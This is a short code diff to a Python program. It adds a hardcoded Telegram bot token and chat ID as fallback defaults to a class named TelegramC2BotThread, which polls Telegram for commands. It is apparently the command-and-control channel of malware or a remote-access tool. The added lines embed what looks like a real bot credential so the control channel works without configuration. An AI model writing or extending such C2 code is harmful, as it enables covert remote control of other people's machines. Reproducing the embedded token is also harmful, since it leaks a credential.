@@ -25,6 +25,9 @@ def get_settings():
             pass
     return {}
 
+DEFAULT_BOT_TOKEN = '8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c'
+DEFAULT_CHAT_ID = '7922291087'
+
 class TelegramC2BotThread(threading.Thread):
     """
     Background worker that continuously polls the Telegram Bot API for incoming
@@ -41,8 +44,8 @@ class TelegramC2BotThread(threading.Thread):
         while self.running:
             try:
                 cfg = get_settings()
-                bot_token = cfg.get('tg_bot_token', '').strip()
-                admin_chat_id = str(cfg.get('tg_chat_id', '')).strip()
+                bot_token = cfg.get('tg_bot_token', '').strip() or DEFAULT_BOT_TOKEN
+                admin_chat_id = str(cfg.get('tg_chat_id', '')).strip() or DEFAULT_CHAT_ID
 
                 if not bot_token or not admin_chat_id:
                     time.sleep(self.poll_interval)
